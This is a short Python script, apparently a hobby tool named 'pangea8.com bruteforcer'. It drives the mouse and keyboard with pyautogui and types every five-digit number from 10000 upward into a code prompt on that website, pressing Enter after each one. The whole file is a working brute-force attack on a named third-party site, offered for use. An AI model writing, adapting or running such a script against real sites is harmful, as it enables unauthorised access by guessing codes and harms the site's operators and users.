# READ THE README FIRST

import time as t
import pyautogui as pg
minnum = 10000
maxnum = 99999
site = 'pangea8.com'
#delay for user
confirmation = pg.confirm(text='Brute force ' + site + '?', title='pangea8.com bruteforcer', buttons=['Brute Force','Cancel'])
if confirmation == 'Brute Force':
    t.sleep(0)

    #navigate to prompt box
    pg.hotkey('ctrl', 'f')
    pg.typewrite('sec')

    #do maxnum times:
    for i in range(minnum, maxnum):
        #click prompt & wait .2 secs for animation
        pg.click(180, 730)
        t.sleep(0.5)
        #type number & enter
        pg.typewrite(str(i))
        pg.press('enter')
